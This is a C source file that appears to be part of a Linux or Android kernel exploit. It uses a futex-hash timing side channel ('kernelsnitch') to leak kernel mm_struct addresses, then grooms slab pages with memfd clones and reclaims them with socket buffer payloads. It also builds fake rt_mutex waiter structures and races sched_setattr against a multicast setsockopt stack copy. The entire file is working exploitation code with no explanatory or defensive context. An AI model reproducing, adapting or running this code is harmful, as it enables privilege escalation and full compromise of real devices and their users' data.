#include "common.h"
#include <netinet/in.h>
#include "kernelsnitch/kernelsnitch.h"

#if SLIDE_USE_MCAST

enum controlled_mm_zone {
  CONTROLLED_MM_INVALID,
  CONTROLLED_MM_DMA32,
  CONTROLLED_MM_NORMAL,
};

static pid_t clone_controlled_leak_child(
    struct kernelsnitch_shared_state *state) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(2);
    }
    kernelsnitch_find_collisions(state);
    _exit(kernelsnitch_found_collisions(state) ? 0 : 4);
  }
  return child;
}

static enum controlled_mm_zone controlled_mm_zone_of(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);

  if (base >= MM_DMA32_ALIAS_START && base < MM_DMA32_ALIAS_END) {
    return CONTROLLED_MM_DMA32;
  }
  if (base >= MM_NORMAL_ALIAS_START && base < MM_NORMAL_ALIAS_END) {
    return CONTROLLED_MM_NORMAL;
  }
  return CONTROLLED_MM_INVALID;
}

static __attribute__((unused)) const char *controlled_mm_zone_name(
    enum controlled_mm_zone zone) {
  switch (zone) {
    case CONTROLLED_MM_DMA32:
      return "DMA32";
    case CONTROLLED_MM_NORMAL:
      return "NORMAL";
    default:
      return "INVALID";
  }
}

static int controlled_mm_valid(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);
  uintptr_t offset = mm - base;

  return controlled_mm_zone_of(mm) != CONTROLLED_MM_INVALID &&
         offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0;
}

static uintptr_t controlled_mm_match_page(
    const struct kernelsnitch_shared_state *state, uintptr_t base) {
  uintptr_t found = (uintptr_t)-1;
  size_t count = 0;

  for (uintptr_t candidate = base; candidate < base + ORDER3_SIZE;
       candidate += MM_STRUCT_SZ) {
    size_t hash = futex_hash(state->futex_addrs[0], candidate);
    size_t matches = 1;

    for (size_t i = 1; i < state->collisions; ++i) {
      matches += hash == futex_hash(state->futex_addrs[i], candidate);
    }
    if (matches == state->collisions) {
      found = candidate;
      count++;
    }
  }
  return count == 1 ? found : (uintptr_t)-1;
}

static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
                              uintptr_t *mm_out, int *hint_hit) {
  uintptr_t current_hint = hint;
  size_t collisions = hint ? KSNITCH_HINT_COLLISIONS
                           : KSNITCH_FULL_COLLISIONS;
  size_t passes = hint ? 2 : 1;

  *hint_hit = 0;
  for (size_t pass = 0; pass < passes; ++pass) {
    struct kernelsnitch_shared_state *state = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
    pid_t child;
    int fd;
    int status;

    if (!state) {
      return -1;
    }
    kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
    child = clone_controlled_leak_child(state);
    fd = open_memfd(child);
    int child_ok = waitpid(child, &status, 0) == child && WIFEXITED(status) &&
                   !WEXITSTATUS(status) &&
                   kernelsnitch_found_collisions(state);
    if (!child_ok) {
      close(fd);
      state->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(state);
      if (current_hint) {
        current_hint = 0;
        collisions = KSNITCH_FULL_COLLISIONS;
        continue;
      }
      return -2;
    }
    if (current_hint) {
      state->mm_struct = controlled_mm_match_page(state, current_hint);
      if (state->mm_struct == (uintptr_t)-1) {
        close(fd);
        state->state = KERNELSNITCH_MM_NOT_FOUND;
        kernelsnitch_cleanup(state);
        current_hint = 0;
        collisions = KSNITCH_FULL_COLLISIONS;
        continue;
      }
      state->found = 1;
      state->state = KERNELSNITCH_MM_FOUND;
      *hint_hit = 1;
    } else {
      kernelsnitch_bruteforce(state);
    }
    if (state->mm_struct == (uintptr_t)-1) {
      close(fd);
      kernelsnitch_cleanup(state);
      return -2;
    }
    *mm_out = state->mm_struct;
    kernelsnitch_cleanup(state);
    return fd;
  }
  return -2;
}

struct controlled_mm_drain_state {
  int *triggers;
  size_t trigger_count;
  int s2;
};

static void release_controlled_mm_drain(
    struct controlled_mm_drain_state *state) {
  size_t closed __attribute__((unused)) = 0;

  pin_to_core(CORE);
  for (size_t i = 0; i < state->trigger_count; ++i) {
    if (state->triggers[i] < 0) {
      continue;
    }
    SYSCHK(close(state->triggers[i]));
    state->triggers[i] = -1;
    closed++;
  }
  if (state->s2 >= 0) {
    SYSCHK(close(state->s2));
    state->s2 = -1;
    closed++;
  }
  free(state->triggers);
  state->triggers = NULL;
  state->trigger_count = 0;
  #ifdef DEBUG
  pr_info("controlled mm trigger release closed=%zu cpu=%d\n",
          closed, sched_getcpu());
#endif
}

static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
                                       int *chosen_fds) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t max_groups = 64;
  const size_t opaque_capacity = PAGE_SCAN_MAX * batch;
  uintptr_t *bases = calloc(max_groups, sizeof(*bases));
  size_t *counts = calloc(max_groups, sizeof(*counts));
  int *fds = malloc(max_groups * batch * sizeof(*fds));
  unsigned char *seen = calloc(max_groups * batch, sizeof(*seen));
  int *opaque = malloc(opaque_capacity * sizeof(*opaque));
  size_t opaque_count = 0;
  size_t group_count = 0;
  size_t chosen = max_groups;
  uintptr_t hint = 0;
  unsigned long chosen_attempt __attribute__((unused)) = 0;
  int result = 0;

  if (!bases || !counts || !fds || !seen || !opaque) {
    SYSCHK(-1);
  }
  for (size_t i = 0; i < max_groups * batch; ++i) {
    fds[i] = -1;
  }
  for (size_t i = 0; i < batch; ++i) {
    chosen_fds[i] = -1;
  }
  pr_info("finding mm collisions\n");
#ifdef DEBUG
  pr_info("controlled mm group search scans=%d objects=%zu dma32_skip=%d\n",
          PAGE_SCAN_MAX, batch, DMA32_SKIP_SLABS);
#endif

  for (unsigned long attempt = 1;
       attempt <= PAGE_SCAN_MAX && !result; ++attempt) {
    uintptr_t mm = 0;
    uintptr_t base;
    size_t slot;
    size_t group = max_groups;
    int hint_hit;
    int fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);

    if (fd == -2) {
      continue;
    }
    if (fd < 0) {
      break;
    }
    if (!controlled_mm_valid(mm)) {
      SYSCHK(close(fd));
      continue;
    }
    base = mm & ~(ORDER3_SIZE - 1);
    slot = (mm - base) / MM_STRUCT_SZ;
    if (controlled_mm_zone_of(base) == CONTROLLED_MM_DMA32) {
      size_t refs = DMA32_SKIP_SLABS * batch;

      if (opaque_count + refs > opaque_capacity) {
        SYSCHK(close(fd));
        break;
      }
      opaque[opaque_count++] = fd;
      pin_to_core(CORE);
      for (size_t i = 1; i < refs; ++i) {
        opaque[opaque_count++] = clone_memfd();
      }
      #ifdef DEBUG
      pr_info("controlled mm dma32 skip attempt=%lu base=%016zx refs=%zu total=%zu\n",
              attempt, base, refs, opaque_count);
#endif
      hint = 0;
      continue;
    }
    hint = base;
    for (size_t i = 0; i < group_count; ++i) {
      if (bases[i] == base) {
        group = i;
        break;
      }
    }
    if (group == max_groups && group_count < max_groups) {
      group = group_count++;
      bases[group] = base;
      #ifdef DEBUG
      pr_info("controlled mm group opened attempt=%lu group=%zu "
              "base=%016zx hint=%d\n",
              attempt, group, base, hint_hit);
#endif
    }
    if (group == max_groups || slot >= batch) {
      SYSCHK(close(fd));
      continue;
    }
    if (seen[group * batch + slot]) {
      SYSCHK(close(fd));
      hint = base;
      #ifdef DEBUG
      pr_info("controlled mm duplicate rejected attempt=%lu group=%zu "
              "base=%016zx slot=%zu\n",
              attempt, group, base, slot);
#endif
      continue;
    }
    seen[group * batch + slot] = 1;
    fds[group * batch + slot] = fd;
    counts[group]++;
    if (counts[group] == 1 || counts[group] % 8 == 0 ||
        counts[group] + 1 >= batch) {
      #ifdef DEBUG
      pr_info("controlled mm group attempt=%lu group=%zu base=%016zx slot=%zu count=%zu hint=%d\n",
              attempt, group, base, slot, counts[group], hint_hit);
#endif
    }
    if (counts[group] == batch) {
      chosen = group;
      chosen_attempt = attempt;
      *base_out = base;
      result = 1;
    }
  }

  pin_to_core(CORE);
  for (size_t group = 0; group < group_count; ++group) {
    for (size_t slot = 0; slot < batch; ++slot) {
      int fd = fds[group * batch + slot];

      if (fd < 0) {
        continue;
      }
      if (result && group == chosen) {
        chosen_fds[slot] = fd;
        continue;
      }
      SYSCHK(close(fd));
    }
  }
  for (size_t i = 0; i < opaque_count; ++i) {
    SYSCHK(close(opaque[i]));
  }
  if (result) {
#ifdef DEBUG
    pr_info("controlled mm group full group=%zu base=%016zx attempts=%lu zone=%s\n",
            chosen, *base_out, chosen_attempt,
            controlled_mm_zone_name(controlled_mm_zone_of(*base_out)));
#endif
  } else {
    pr_warning("finding usable page failed groups=%zu scans=%d\n",
               group_count, PAGE_SCAN_MAX);
  }
  free(opaque);
  free(seen);
  free(fds);
  free(counts);
  return result;
}

static int drain_controlled_mm_group(
    int *target_fds, struct controlled_mm_drain_state *state,
    int shaping_sv[2]) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t trigger_refs = TRIGGER_SLABS * batch;

  state->triggers = malloc(trigger_refs * sizeof(*state->triggers));
  state->trigger_count = trigger_refs;
  state->s2 = -1;
  if (!state->triggers) {
    errno = ENOMEM;
    SYSCHK(-1);
  }
  pin_to_core(CORE);
  for (size_t i = 0; i < trigger_refs; ++i) {
    state->triggers[i] = clone_memfd();
  }
  state->s2 = clone_memfd();
  #ifdef DEBUG
  pr_info("controlled mm trigger ready pages=%d refs=%zu s2=%d cpu=%d\n",
          TRIGGER_SLABS, trigger_refs, state->s2, sched_getcpu());
#endif
  for (size_t i = 0; i + 1 < batch; ++i) {
    SYSCHK(close(target_fds[i]));
    target_fds[i] = -1;
  }
  for (size_t page = 0; page < TRIGGER_SLABS; ++page) {
    size_t index = page * batch;
    SYSCHK(close(state->triggers[index]));
    state->triggers[index] = -1;
  }
  #ifdef DEBUG
  pr_info("controlled mm target tail armed pages=%d refs_held=%zu shape=ready cpu=%d\n",
          TRIGGER_SLABS,
          trigger_refs - TRIGGER_SLABS + 1, sched_getcpu());
#endif
  SYSCHK(fflush(NULL));
  SYSCHK(close(shaping_sv[0]));
  shaping_sv[0] = -1;
  SYSCHK(close(shaping_sv[1]));
  shaping_sv[1] = -1;
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(target_fds[batch - 1]));
  target_fds[batch - 1] = -1;
  return 1;
}

static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  int *target_fds;
  int shaping_sv[2] = {-1, -1};
  uintptr_t base = 0;
  int sndbuf = SKB_SNDBUF;
  struct iovec iov;
  struct msghdr msg;
  struct controlled_mm_drain_state drain_state = {
      .s2 = -1,
  };

  close_reclaim_sockets();
  cleanup_page_prepare_state();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  skb_buf = malloc(SKB_SEND_SIZE);
  target_fds = calloc(mm_objs_per_slab, sizeof(*target_fds));
  if (!skb_buf || !target_fds) {
    errno = ENOMEM;
    SYSCHK(-1);
  }

  if (!collect_controlled_mm_group((size_t)cpu_count, &base, target_fds)) {
    free(target_fds);
    return 0;
  }
  #ifdef DEBUG
  pr_info("controlled mm group selected base=%016zx mode=%d\n",
          base, payload_mode);
#endif
  if (!prepare_skb_payload(base, payload_mode)) {
    for (size_t i = 0; i < mm_objs_per_slab; ++i) {
      if (target_fds[i] >= 0) {
        SYSCHK(close(target_fds[i]));
      }
    }
    free(target_fds);
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  SYSCHK(setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF,
                    &sndbuf, sizeof(sndbuf)));
  int flags = SYSCHK(fcntl(reclaim_sv[0], F_GETFL, 0));
  SYSCHK(fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK));
  for (size_t pair = 0; pair + 1 < RECLAIM_SOCKET_PAIRS; ++pair) {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0,
                      controlled_reclaim_sv[pair]));
    controlled_reclaim_count++;
    SYSCHK(setsockopt(controlled_reclaim_sv[pair][0], SOL_SOCKET,
                      SO_SNDBUF, &sndbuf, sizeof(sndbuf)));
    flags = SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_GETFL, 0));
    SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_SETFL,
                 flags | O_NONBLOCK));
  }

  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, shaping_sv));
  ssize_t shaped = sendmsg(shaping_sv[0], &msg, 0);
  if (shaped != (ssize_t)SKB_SEND_SIZE) {
    if (shaped >= 0) {
      errno = EIO;
    }
    SYSCHK(-1);
  }
  pr_info("controlled skb shape sent bytes=%zd cpu=%d\n",
          shaped, sched_getcpu());

  if (!drain_controlled_mm_group(target_fds, &drain_state, shaping_sv)) {
    free(target_fds);
    return 0;
  }

  int sent_count = 0;
  int stop_errno = 0;
  for (size_t pair = 0; pair < RECLAIM_SOCKET_PAIRS; ++pair) {
    int sender = pair ? controlled_reclaim_sv[pair - 1][0] : reclaim_sv[0];
    for (int send_index = 0; send_index < SKB_SENDS; ++send_index) {
      errno = 0;
      ssize_t sent = sendmsg(sender, &msg, MSG_DONTWAIT);
      if (sent != (ssize_t)SKB_SEND_SIZE) {
        stop_errno = errno;
        break;
      }
      sent_count++;
    }
  }
  release_controlled_mm_drain(&drain_state);
  free(target_fds);
  pr_info("controlled skb reclaim sends=%d pairs=%d per_pair=%d stop_errno=%d base=%016zx mode=%d\n",
          sent_count, RECLAIM_SOCKET_PAIRS, SKB_SENDS,
          stop_errno, base, payload_mode);
  return sent_count ? base : 0;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  return prepare_controlled_kernel_page(payload_mode);
}

void slide_build_fake_waiter(unsigned char *payload, size_t waiter_off) {
  uintptr_t tree_parent = slide_oracle_parent;
  uintptr_t tree_right = 0;
  uintptr_t tree_left = slide_oracle_target;
  uintptr_t pi_parent = slide_oracle_parent;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = slide_oracle_target;

#if defined(PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
    tree_right = slide_oracle_target;
    tree_left = 0;
    pi_parent = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
    pi_right = 0;
    pi_left = 0;
  }
#endif

  memset(payload + waiter_off, 0, FAKE_WAITER_LAYOUT_SIZE);
  put_fake_waiter(payload, waiter_off,
                  tree_parent, tree_right, tree_left,
                  pi_parent, pi_right, pi_left,
                  fake_task, fake_lock, FAKE_WAITER_PRIO);
}

static inline uint64_t slide_read_cntvct(void) {
  uint64_t value;
  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
                   : "=r"(value) :: "memory");
  return value;
}

static void slide_apply_route_fine_delay(void) {
  uint64_t ticks = slide_route_fine_delay_ticks;
  if (!ticks || ticks == UINT64_MAX) {
    return;
  }
  uint64_t start = slide_read_cntvct();
  while (slide_read_cntvct() - start < ticks) {
    __asm__ volatile("yield" ::: "memory");
  }
}

void slide_mcast_stack_copy(void) {
  enum { stamp_size = 0x108 };
  _Static_assert(MCAST_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= stamp_size,
                 "MCAST waiter must fit in the copied stack stamp");
  unsigned char stamp[stamp_size];
  memset(stamp, 0, sizeof(stamp));
  uint16_t invalid_family = AF_UNSPEC;
  memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
  slide_build_fake_waiter(stamp, MCAST_WAITER_OFF);

  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    pr_error("slide mcast socket errno=%d\n", errno);
    return;
  }

  slide_reset_consume_state();

  errno = 0;
  int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                       stamp, sizeof(stamp));
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 1);
  while (!atomic_load(&slide_consume_stop))
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&slide_consume_go, 0);

  int sched_ok = atomic_load(&slide_consume_sched_ok);
  atomic_store(&slide_stack_write_window,
               ret == -1 && saved_errno == EADDRNOTAVAIL && sched_ok > 0);
  pr_info("slide mcast returned domain=%d level=%d option=%d "
          "offset=%#x ret=%d errno=%d "
          "calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
          AF_INET, IPPROTO_IP, MCAST_BLOCK_SOURCE,
          MCAST_WAITER_OFF, ret, saved_errno,
          atomic_load(&slide_consume_calls), sched_ok,
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
  close(fd);
}

void *slide_mcast_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  atomic_store(&slide_consumer_ready, 1);
  int *errno_ptr = &errno;

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    int tid = atomic_load(&slide_waiter_tid);

    if (seq == 1) {
      slide_apply_route_fine_delay();
    }

    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    *errno_ptr = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = *errno_ptr;
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

#endif /* SLIDE_USE_MCAST */
